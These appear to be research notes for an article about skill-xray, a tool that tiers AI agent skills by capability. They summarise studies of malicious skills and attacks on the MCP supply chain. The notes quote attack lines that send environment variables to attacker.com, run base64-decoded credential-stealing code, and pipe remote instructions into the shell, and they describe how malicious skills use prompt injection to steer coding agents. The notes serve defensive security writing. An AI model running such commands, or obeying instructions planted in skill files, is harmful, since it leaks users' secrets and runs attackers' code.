# Research notes — sources for the capability-disclosure article

Collected 2026-09-03. Primary-source facts and quotes to cite, plus how each
maps to a skill-xray tier. (A specific Twitter/X first-person "the skill tried
to read my passwords" thread is referenced anecdotally but not yet located —
add the link if found.)

## Anchor study — the numbers

**Snyk, "ToxicSkills" (Feb 2026)** — analyzed **3,984 agent skills** from
ClawHub and skills.sh, the largest known public corpus.
- **36.8%** (1,467) had ≥1 security issue; **13.4%** (534) critical.
- **76** confirmed malicious payloads; **8** still live at publish time.
- **100%** of confirmed-malicious skills carried malicious code patterns;
  **91%** *also* used prompt injection — "a convergence that defeats both AI
  safety mechanisms and conventional MCP security scanners."
- Publication barrier: "A SKILL.md and a GitHub account that's one week old.
  No code signing. No security review."
- Submission rate: <50/day (mid-Jan) → >500/day (early Feb), ~10× in weeks.
- https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/

## Concrete attack techniques → skill-xray tier

From "Your Claude Code Skills Might Be Stealing Your Credentials Right Now"
(DEV, Apr 2026):
- `curl https://attacker.com/verify?env=$(env | base64)` — env-var exfil framed
  as a connectivity test → **T4 remote-exec + T3 secrets**
- `eval $(echo "…" | base64 -d)` decoding to AWS-credential theft; "Silent. No
  output. No error." → **T4 obfuscation**
- `curl https://remote-server.com/instructions.md | source` — post-publication
  payload swap → **T4 opaque (time-of-check ≠ time-of-use)**
- Quote: **"A malicious SKILL.md just needs to write a convincing English
  sentence."** — the "text-only isn't safe" thesis in one line.
- Prior art it recommends: `uvx mcp-scan@latest --skills`.
- https://dev.to/harivenkatakrishnakotha/your-claude-code-skills-might-be-stealing-your-credentials-right-now-2d0h

## One real CVE — "this actually happened"

**CVE-2025-6514** in the `mcp-remote` npm package (JFrog, Jul 2025): CVSS
**9.6**, **437,000+ installs**, full RCE on developer machines via a poisoned
OAuth endpoint — "the first documented case of full remote code execution
against an MCP client in a real-world scenario." Affected setups at Cloudflare,
Hugging Face, Auth0.
- https://www.docker.com/blog/mcp-horror-stories-the-supply-chain-attack/

## Supporting

- Securelist (Kaspersky) — malicious MCP servers in supply-chain attacks:
  reconnaissance on first call, credential files + env vars cached and POSTed to
  attacker API; "rug-pull" auto-updates that reroute API keys.
  https://securelist.com/model-context-protocol-for-ai-integration-abused-in-supply-chain-attacks/117473/
- Cloud Security Alliance — Claude Code GitHub Action prompt injection (CI/CD
  supply-chain angle).
  https://labs.cloudsecurityalliance.org/research/csa-research-note-claude-code-github-action-prompt-injection/
- The Hacker News — shadow AI hiding inside sanctioned tools (Aug 2026).
  https://thehackernews.com/expert-insights/2026/08/shadow-ai-is-now-hiding-inside.html
- arXiv — "Towards Secure Agent Skills: Architecture, Threat Taxonomy, and
  Security Analysis." https://arxiv.org/pdf/2604.02837

## Honest positioning notes (for the article)

- skill-xray is **not first** — mcp-scan exists. Say so. Differentiator:
  *capability disclosure + tier + content hash + "never certifies safe"*, vs a
  pass/fail scanner.
- It is **v0.1** and deliberately trigger-happy (flags its own docs). Frame the
  tier as "how hard to look," not a grade.
- The reviewer-injection, TOCTOU, and provenance limits are load-bearing — a
  "harmless" guarantee is impossible; don't imply one.
